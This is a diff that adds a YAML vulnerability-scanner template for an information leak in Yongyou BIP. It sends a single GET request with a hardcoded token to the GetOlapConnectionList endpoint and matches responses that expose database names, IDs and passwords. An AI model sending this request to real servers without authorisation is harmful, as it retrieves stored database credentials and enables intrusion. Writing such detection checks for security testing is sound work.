@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-bip-getolapconnectionList-info-leak
+info:
+  name: Yongyou BIP /SemanticModel/GetOlapConnectionList Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "/bi/api/SemanticModel/GetOlapConnectionList/?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339"
+    headers:
+      Accept: application/json
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(find_json(body,"0.DatabaseName"), "")
+          - contains(find_json(body,"0.Id"), "")
+          - contains(find_json(body,"0.Password"), "")
